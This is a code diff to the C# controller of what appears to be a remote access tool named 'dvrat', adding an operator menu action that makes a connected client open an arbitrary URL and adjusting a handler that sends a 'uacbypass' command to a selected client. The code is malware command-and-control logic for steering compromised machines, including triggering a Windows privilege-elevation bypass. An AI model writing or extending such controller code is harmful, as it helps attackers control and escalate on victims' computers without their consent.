@@ -258,7 +258,21 @@ namespace dvrat
             {
                 if (!delete_if_not_connect(client))
                 {
-                    send_to_client(client, "uacbypass;");
+                    dataGridView1.Rows.RemoveAt(this.selected_client_index);
+                    send_to_client(client, "uacbypass;");                    
+                }
+            }
+        }
+
+        private void openwebToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            string url = Microsoft.VisualBasic.Interaction.InputBox("URL", "Open Url", "http://", 100, 200);
+            Socket client = get_client_by_index(this.selected_client_index);
+            if (client != null)
+            {
+                if (!delete_if_not_connect(client))
+                {
+                    send_to_client(client, $"open_this_url;\n{url}");
                 }
             }
         }
@@ -425,6 +439,7 @@ namespace dvrat
             }
         }
 
+    
 
         #endregion
 
@@ -1121,9 +1136,11 @@ namespace dvrat
 
 
 
+
+
         /* END server functions */
         #endregion
 
-
+      
     }
 }
